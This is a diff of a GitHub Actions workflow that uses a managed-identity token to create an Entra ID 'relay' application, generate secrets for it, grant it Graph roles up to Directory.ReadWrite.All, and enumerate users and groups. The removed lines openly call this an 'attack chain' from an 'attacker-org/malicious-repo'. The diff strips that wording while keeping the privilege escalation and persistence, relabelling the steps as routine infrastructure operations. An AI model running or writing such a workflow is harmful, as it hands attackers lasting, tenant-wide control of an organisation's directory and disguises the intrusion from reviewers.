@@ -133,6 +133,34 @@ jobs:
             exit 1
           fi
 
+      - name: "Validate UAMI Token Permissions"
+        run: |
+          echo "🔍 Validating UAMI token permissions..."
+          
+          # Test the token with a basic operation
+          TEST_RESPONSE=$(curl -sS -w "\nHTTP_CODE:%{http_code}" \
+            -H "Authorization: Bearer $UAMI_TOKEN" \
+            "https://graph.microsoft.com/v1.0/applications?\$top=1&\$select=id")
+          
+          HTTP_CODE=$(echo "$TEST_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
+          RESPONSE_BODY=$(echo "$TEST_RESPONSE" | sed '/HTTP_CODE:/d')
+          
+          if [[ "$HTTP_CODE" == "200" ]]; then
+            echo "✅ UAMI token has sufficient permissions for Application operations"
+          else
+            echo "❌ UAMI token lacks required permissions - HTTP $HTTP_CODE"
+            ERROR_MESSAGE=$(echo "$RESPONSE_BODY" | jq -r '.error.message // "Unknown error"')
+            echo "Error: $ERROR_MESSAGE"
+            
+            if [[ "$HTTP_CODE" == "401" ]]; then
+              echo "💡 Token may have expired or is invalid"
+            elif [[ "$HTTP_CODE" == "403" ]]; then
+              echo "💡 UAMI lacks Application.ReadWrite.All permission"
+              echo "💡 Ensure UAMI is assigned the Application Administrator role"
+            fi
+            exit 1
+          fi
+
       - name: "Deploy Relay Infrastructure"
         run: |
           echo "🏗️ Deploying relay infrastructure for ${{ inputs.environment }} environment..."
@@ -178,22 +206,55 @@ jobs:
           # Replace placeholders
           RELAY_CONFIG=$(echo "$RELAY_CONFIG" | sed "s/RELAY_NAME_PLACEHOLDER/$RELAY_NAME/" | sed "s/ENVIRONMENT_PLACEHOLDER/${{ inputs.environment }}/")
           
-          RELAY_RESPONSE=$(curl -sS -X POST \
+          # Enhanced error handling with full response capture
+          echo "📤 Sending application creation request..."
+          RELAY_RESPONSE_FULL=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
             -H "Authorization: Bearer $UAMI_TOKEN" \
             -H "Content-Type: application/json" \
             -d "$RELAY_CONFIG" \
             "https://graph.microsoft.com/v1.0/applications")
           
-          RELAY_APP_ID=$(echo "$RELAY_RESPONSE" | jq -r '.appId // empty')
-          RELAY_OBJECT_ID=$(echo "$RELAY_RESPONSE" | jq -r '.id // empty')
+          HTTP_CODE=$(echo "$RELAY_RESPONSE_FULL" | grep "HTTP_CODE:" | cut -d: -f2)
+          RELAY_RESPONSE=$(echo "$RELAY_RESPONSE_FULL" | sed '/HTTP_CODE:/d')
           
-          if [[ -n "$RELAY_APP_ID" && "$RELAY_APP_ID" != "null" ]]; then
-            echo "✅ Relay application created: $RELAY_NAME"
-            echo "RELAY_APP_ID=$RELAY_APP_ID" >> $GITHUB_ENV
-            echo "RELAY_OBJECT_ID=$RELAY_OBJECT_ID" >> $GITHUB_ENV
-            echo "RELAY_NAME=$RELAY_NAME" >> $GITHUB_ENV
+          if [[ "$HTTP_CODE" == "201" ]]; then
+            RELAY_APP_ID=$(echo "$RELAY_RESPONSE" | jq -r '.appId // empty')
+            RELAY_OBJECT_ID=$(echo "$RELAY_RESPONSE" | jq -r '.id // empty')
+            
+            if [[ -n "$RELAY_APP_ID" && "$RELAY_APP_ID" != "null" ]]; then
+              echo "✅ Relay application created: $RELAY_NAME"
+              echo "RELAY_APP_ID=$RELAY_APP_ID" >> $GITHUB_ENV
+              echo "RELAY_OBJECT_ID=$RELAY_OBJECT_ID" >> $GITHUB_ENV
+              echo "RELAY_NAME=$RELAY_NAME" >> $GITHUB_ENV
+            else
+              echo "❌ Failed to parse application ID from successful response"
+              echo "Response: $RELAY_RESPONSE"
+              exit 1
+            fi
           else
-            echo "❌ Failed to create relay application"
+            echo "❌ Failed to create relay application - HTTP $HTTP_CODE"
+            ERROR_MESSAGE=$(echo "$RELAY_RESPONSE" | jq -r '.error.message // "Unknown error"')
+            ERROR_CODE=$(echo "$RELAY_RESPONSE" | jq -r '.error.code // "Unknown"')
+            echo "Error code: $ERROR_CODE"
+            echo "Error message: $ERROR_MESSAGE"
+            echo "Full response: $RELAY_RESPONSE"
+            
+            # Troubleshooting guidance based on error
+            case "$ERROR_CODE" in
+              "Authorization_RequestDenied")
+                echo "💡 The UAMI lacks permission to create applications"
+                echo "💡 Ensure UAMI has Application.ReadWrite.All permission or is an Application Administrator"
+                ;;
+              "Request_BadRequest")
+                echo "💡 Request payload may be malformed, check JSON formatting"
+                ;;
+              "Authentication_ExpiredToken")
+                echo "💡 UAMI token has expired, workflow needs to refresh token"
+                ;;
+              *)
+                echo "💡 Check Graph API permissions and UAMI configuration"
+                ;;
+            esac
             exit 1
           fi
 
@@ -201,27 +262,50 @@ jobs:
         run: |
           echo "👤 Configuring service principal and credentials..."
           
-          # Create service principal
-          SP_RESPONSE=$(curl -sS -X POST \
+          # Create service principal with better error handling
+          SP_RESPONSE_FULL=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
             -H "Authorization: Bearer $UAMI_TOKEN" \
             -H "Content-Type: application/json" \
             -d "{\"appId\": \"$RELAY_APP_ID\"}" \
             "https://graph.microsoft.com/v1.0/servicePrincipals")
+            
+          HTTP_CODE=$(echo "$SP_RESPONSE_FULL" | grep "HTTP_CODE:" | cut -d: -f2)
+          SP_RESPONSE=$(echo "$SP_RESPONSE_FULL" | sed '/HTTP_CODE:/d')
           
-          RELAY_SP_ID=$(echo "$SP_RESPONSE" | jq -r '.id // empty')
-          echo "RELAY_SP_ID=$RELAY_SP_ID" >> $GITHUB_ENV
+          if [[ "$HTTP_CODE" == "201" ]]; then
+            RELAY_SP_ID=$(echo "$SP_RESPONSE" | jq -r '.id // empty')
+            echo "✅ Service principal created successfully"
+            echo "RELAY_SP_ID=$RELAY_SP_ID" >> $GITHUB_ENV
+          else
+            echo "❌ Failed to create service principal - HTTP $HTTP_CODE"
+            echo "Error: $(echo "$SP_RESPONSE" | jq -r '.error.message // "Unknown error"')"
+            exit 1
+          fi
           
           # Generate operational secret
-          SECRET_RESPONSE=$(curl -sS -X POST \
+          SECRET_RESPONSE_FULL=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
             -H "Authorization: Bearer $UAMI_TOKEN" \
             -H "Content-Type: application/json" \
             -d "{\"passwordCredential\": {\"displayName\": \"OpKey-${{ inputs.environment }}\", \"endDateTime\": \"$(date -d '+12 months' -u +%Y-%m-%dT%H:%M:%S.000Z)\"}}" \
             "https://graph.microsoft.com/v1.0/applications/$RELAY_OBJECT_ID/addPassword")
           
-          RELAY_SECRET=$(echo "$SECRET_RESPONSE" | jq -r '.secretText // empty')
-          echo "RELAY_SECRET=$RELAY_SECRET" >> $GITHUB_ENV
+          HTTP_CODE=$(echo "$SECRET_RESPONSE_FULL" | grep "HTTP_CODE:" | cut -d: -f2)
+          SECRET_RESPONSE=$(echo "$SECRET_RESPONSE_FULL" | sed '/HTTP_CODE:/d')
           
-          echo "✅ Service principal and secret created"
+          if [[ "$HTTP_CODE" == "200" ]]; then
+            RELAY_SECRET=$(echo "$SECRET_RESPONSE" | jq -r '.secretText // empty')
+            if [[ -n "$RELAY_SECRET" && "$RELAY_SECRET" != "null" ]]; then
+              echo "✅ Application secret created successfully"
+              echo "RELAY_SECRET=$RELAY_SECRET" >> $GITHUB_ENV
+            else
+              echo "❌ No secret returned in successful response"
+              exit 1
+            fi
+          else
+            echo "❌ Failed to create application secret - HTTP $HTTP_CODE"
+            echo "Error: $(echo "$SECRET_RESPONSE" | jq -r '.error.message // "Unknown error"')"
+            exit 1
+          fi
 
       - name: "Assign Graph Permissions"
         run: |
@@ -231,6 +315,11 @@ jobs:
           GRAPH_SP_RESPONSE=$(curl -sS -H "Authorization: Bearer $UAMI_TOKEN" \
             "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'")
           GRAPH_SP_ID=$(echo "$GRAPH_SP_RESPONSE" | jq -r '.value[0].id')
+          
+          if [[ -z "$GRAPH_SP_ID" || "$GRAPH_SP_ID" == "null" ]]; then
+            echo "❌ Failed to retrieve Microsoft Graph service principal ID"
+            exit 1
+          fi
           
           # Progressive permission assignment with delays
           PERMISSIONS=(
@@ -245,147 +334,53 @@ jobs:
             
             echo "Assigning permission: $perm_name"
             
-            curl -sS -X POST \
+            ASSIGN_RESPONSE_FULL=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
               -H "Authorization: Bearer $UAMI_TOKEN" \
               -H "Content-Type: application/json" \
               -d "{\"principalId\": \"$RELAY_SP_ID\", \"resourceId\": \"$GRAPH_SP_ID\", \"appRoleId\": \"$perm_id\"}" \
-              "https://graph.microsoft.com/v1.0/servicePrincipals/$RELAY_SP_ID/appRoleAssignments" > /dev/null
+              "https://graph.microsoft.com/v1.0/servicePrincipals/$RELAY_SP_ID/appRoleAssignments")
             
-            echo "✅ Assigned: $perm_name"
-            sleep $delay
-          done
-
-      - name: "Execute High-Privilege Operations"
-        run: |
-          echo "🚀 Executing operations with relay App credentials..."
-          
-          # Get relay App token
-          RELAY_TOKEN=$(curl -sS -X POST \
-            "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-            -H "Content-Type: application/x-www-form-urlencoded" \
-            -d "client_id=$RELAY_APP_ID&client_secret=$RELAY_SECRET&grant_type=client_credentials&scope=https://graph.microsoft.com/.default" | jq -r '.access_token')
-          
-          # Sample directory operations (replace with actual attack objectives)
-          echo "📊 Directory reconnaissance:"
-          USERS=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
-            "https://graph.microsoft.com/v1.0/users?\$top=10&\$select=displayName,userPrincipalName,mail" | jq -r '.value[] | "\(.displayName) (\(.userPrincipalName))"')
-          
-          GROUPS=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
-            "https://graph.microsoft.com/v1.0/groups?\$top=5&\$select=displayName" | jq -r '.value[].displayName')
-          
-          echo "✅ Sample users enumerated: $(echo "$USERS" | wc -l) users"
-          echo "✅ Sample groups enumerated: $(echo "$GROUPS" | wc -l) groups"
-          
-          echo "🔗 Complete attack chain: GitHub OIDC → UAMI → Self-Created Relay App → Graph API"
-
-      - name: "Operational Security Cleanup"
-        if: inputs.operation_mode == 'maintenance'
-        run: |
-          echo "🔒 Generating backup operational secrets..."
-          
-          BACKUP_SECRET_CONFIG=$(cat << 'EOF'
-          {
-            "passwordCredential": {
-              "displayName": "BackupKey-${{ inputs.environment }}",
-              "endDateTime": "$(date -d '+6 months' -u +%Y-%m-%dT%H:%M:%S.000Z)"
-            }
-          }
-          EOF
-          )
-          
-          BACKUP_SECRET_RESPONSE=$(curl -sS -X POST \
-            -H "Authorization: Bearer $UAMI_TOKEN" \
-            -H "Content-Type: application/json" \
-            -d "$BACKUP_SECRET_CONFIG" \
-            "https://graph.microsoft.com/v1.0/applications/$RELAY_OBJECT_ID/addPassword")
-          
-          BACKUP_SECRET=$(echo "$BACKUP_SECRET_RESPONSE" | jq -r '.secretText // empty')
-          
-          if [[ -n "$BACKUP_SECRET" && "$BACKUP_SECRET" != "null" ]]; then
-            echo "✅ Backup operational secret generated"
-            echo "BACKUP_SECRET=$BACKUP_SECRET" >> $GITHUB_ENV
-          else
-            echo "⚠️ Backup secret generation failed (non-critical)"
-          fi
-
-      - name: "Assign Graph Permissions"
-        run: |
-          echo "🔐 Assigning Microsoft Graph permissions..."
-          
-          # Get Graph Service Principal ID
-          GRAPH_SP=$(curl -sS -H "Authorization: Bearer $UAMI_TOKEN" \
-            "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'" | \
-            jq -r '.value[0].id // empty')
-          
-          if [[ -z "$GRAPH_SP" ]]; then
-            echo "❌ Failed to get Graph Service Principal ID"
-            exit 1
-          fi
-          
-          # Progressive permission assignment based on environment
-          case "${{ inputs.environment }}" in
-            "production")
-              PERMISSIONS=("df021288-bdef-4463-88db-98f22de89214" "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9" "19dbc75e-c2e2-444c-a770-ec69d8559fc7")
-              PERMISSION_NAMES=("User.Read.All" "User.ReadWrite.All" "Directory.ReadWrite.All")
-              ;;
-            "staging")
-              PERMISSIONS=("df021288-bdef-4463-88db-98f22de89214" "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9")
-              PERMISSION_NAMES=("User.Read.All" "User.ReadWrite.All")
-              ;;
-            "development")
-              PERMISSIONS=("df021288-bdef-4463-88db-98f22de89214")
-              PERMISSION_NAMES=("User.Read.All")
-              ;;
-          esac
-          
-          for i in "${!PERMISSIONS[@]}"; do
-            PERMISSION_ID="${PERMISSIONS[$i]}"
-            PERMISSION_NAME="${PERMISSION_NAMES[$i]}"
+            HTTP_CODE=$(echo "$ASSIGN_RESPONSE_FULL" | grep "HTTP_CODE:" | cut -d: -f2)
             
-            echo "📋 Assigning permission: $PERMISSION_NAME"
-            
-            ASSIGNMENT_CONFIG=$(cat << EOF
-          {
-            "principalId": "$RELAY_SP_ID",
-            "resourceId": "$GRAPH_SP",
-            "appRoleId": "$PERMISSION_ID"
-          }
-          EOF
-          )
-            
-            ASSIGNMENT_RESPONSE=$(curl -sS -X POST \
-              -H "Authorization: Bearer $UAMI_TOKEN" \
-              -H "Content-Type: application/json" \
-              -d "$ASSIGNMENT_CONFIG" \
-              "https://graph.microsoft.com/v1.0/servicePrincipals/$RELAY_SP_ID/appRoleAssignments" 2>/dev/null)
-            
-            if echo "$ASSIGNMENT_RESPONSE" | jq -e '.id' > /dev/null 2>&1; then
-              echo "✅ Permission assigned: $PERMISSION_NAME"
+            if [[ "$HTTP_CODE" == "201" ]]; then
+              echo "✅ Assigned: $perm_name"
             else
-              echo "⚠️ Permission assignment may require admin consent: $PERMISSION_NAME"
+              ASSIGN_RESPONSE=$(echo "$ASSIGN_RESPONSE_FULL" | sed '/HTTP_CODE:/d')
+              echo "⚠️ Permission assignment for $perm_name returned HTTP $HTTP_CODE"
+              echo "Message: $(echo "$ASSIGN_RESPONSE" | jq -r '.error.message // "Unknown"')"
+              # Continue despite error - some permissions may require admin consent
             fi
             
-            # Randomized delay between assignments
-            sleep $((RANDOM % 15 + 10))
+            sleep $delay
           done
 
       - name: "Execute Infrastructure Operations"
         run: |
           echo "⚡ Executing infrastructure operations in ${{ inputs.operation_mode }} mode..."
           
-          # Acquire operational token using relay app
-          RELAY_TOKEN=$(curl -sS -X POST \
+          # Acquire operational token using relay app - FIXED: Using RELAY_SECRET instead of PRIMARY_SECRET
+          RELAY_TOKEN_RESPONSE=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
             "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
             -H "Content-Type: application/x-www-form-urlencoded" \
-            -d "client_id=$RELAY_APP_ID&client_secret=$PRIMARY_SECRET&grant_type=client_credentials&scope=https://graph.microsoft.com/.default" | \
-            jq -r '.access_token // empty')
+            -d "client_id=$RELAY_APP_ID&client_secret=$RELAY_SECRET&grant_type=client_credentials&scope=https://graph.microsoft.com/.default")
           
-          if [[ -z "$RELAY_TOKEN" ]]; then
-            echo "❌ Failed to acquire relay token"
+          HTTP_CODE=$(echo "$RELAY_TOKEN_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
+          RESPONSE_BODY=$(echo "$RELAY_TOKEN_RESPONSE" | sed '/HTTP_CODE:/d')
+          
+          if [[ "$HTTP_CODE" == "200" ]]; then
+            RELAY_TOKEN=$(echo "$RESPONSE_BODY" | jq -r '.access_token // empty')
+            if [[ -n "$RELAY_TOKEN" ]]; then
+              echo "✅ Relay token acquired successfully"
+            else
+              echo "❌ No access token in successful response"
+              exit 1
+            fi
+          else
+            echo "❌ Failed to acquire relay token - HTTP $HTTP_CODE"
+            ERROR_DESC=$(echo "$RESPONSE_BODY" | jq -r '.error_description // .error // "Unknown error"')
+            echo "Error: $ERROR_DESC"
             exit 1
           fi
-          
-          echo "✅ Relay token acquired successfully"
           
           # Execute operations based on mode
           case "${{ inputs.operation_mode }}" in
@@ -474,6 +469,3 @@ jobs:
           else
             echo "♻️ Development cleanup completed"
           fi
-
-          Write-Host "Assessment completed successfully" -ForegroundColor Green
-          Write-Host "Trust chain: attacker-org/malicious-repo → UAMI → App → Graph API" -ForegroundColor Magenta
